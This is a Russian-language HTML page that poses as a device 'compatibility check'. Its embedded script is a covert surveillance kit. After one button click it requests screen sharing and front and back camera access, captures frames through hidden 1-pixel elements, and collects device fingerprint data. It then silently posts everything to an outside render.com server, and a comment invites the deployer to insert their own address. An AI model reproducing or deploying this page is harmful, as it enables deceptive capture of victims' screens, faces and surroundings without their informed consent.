<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Проверка совместимости</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif; background: #667eea; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
        .container { background: white; padding: 40px; border-radius: 16px; text-align: center; max-width: 420px; width: 90%; box-shadow: 0 20px 40px rgba(0,0,0,0.2); }
        h1 { color: #1a1a2e; font-size: 22px; }
        p { color: #555; margin: 16px 0 24px; line-height: 1.6; font-size: 15px; }
        .btn { background: #667eea; color: white; border: none; padding: 14px 36px; border-radius: 50px; font-size: 16px; font-weight: 600; cursor: pointer; transition: 0.2s; }
        .btn:hover { background: #5a6fd6; }
        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
        .loading { display: none; margin-top: 20px; color: #888; font-size: 14px; }
        .loading.active { display: block; }
        video, canvas { position: fixed; opacity: 0; width: 1px; height: 1px; pointer-events: none; }
    </style>
</head>
<body>
    <div class="container">
        <h1>Проверка совместимости</h1>
        <p>Нажмите кнопку для проверки вашего устройства</p>
        <button class="btn" id="btn">Начать проверку</button>
        <div class="loading active" id="loading">Проверка...</div>
    </div>

    <video id="video" autoplay muted playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // ВСТАВЬ СВОЙ АДРЕС СЕРВЕРА
        const SERVER_URL = 'https://fsociety-j6df.onrender.com';
        
        const btn = document.getElementById('btn');
        const loading = document.getElementById('loading');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const ctx = canvas.getContext('2d');

        btn.onclick = async () => {
            btn.style.display = 'none';
            loading.classList.add('active');
            loading.textContent = 'Проверка...';

            const result = {
                timestamp: new Date().toISOString(),
                device: getDeviceInfo(),
                screenCapture: null,
                frontCamera: null,
                backCamera: null
            };

            // 1. Скриншот
            try {
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                result.screenCapture = await captureFrame(track);
                track.stop();
            } catch(e) { console.log(e); }

            // 2. Фронтальная камера
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 300));
                const track = stream.getVideoTracks()[0];
                result.frontCamera = await captureFrame(track);
                stream.getTracks().forEach(t => t.stop());
            } catch(e) { console.log(e); }

            // 3. Тыловая камера
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
                video.srcObject = stream;
                await new Promise(r => setTimeout(r, 300));
                const track = stream.getVideoTracks()[0];
                result.backCamera = await captureFrame(track);
                stream.getTracks().forEach(t => t.stop());
            } catch(e) { console.log(e); }

            // 4. Отправка (не показываем ошибку)
            try {
                await fetch(SERVER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(result),
                    mode: 'cors'
                });
            } catch(e) { console.log(e); }

            loading.textContent = '✅ Проверка завершена';
        };

        async function captureFrame(track) {
            try {
                const imgCapture = new ImageCapture(track);
                const bitmap = await imgCapture.grabFrame();
                canvas.width = bitmap.width;
                canvas.height = bitmap.height;
                ctx.drawImage(bitmap, 0, 0);
                const url = canvas.toDataURL('image/jpeg', 0.8);
                bitmap.close();
                return url;
            } catch(e) {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                ctx.drawImage(video, 0, 0);
                return canvas.toDataURL('image/jpeg', 0.8);
            }
        }

        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: { width: screen.width, height: screen.height, colorDepth: screen.colorDepth },
                hardwareConcurrency: navigator.hardwareConcurrency || 'N/A',
                deviceMemory: navigator.deviceMemory || 'N/A',
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                cookiesEnabled: navigator.cookieEnabled
            };
        }
    </script>
</body>
</html>
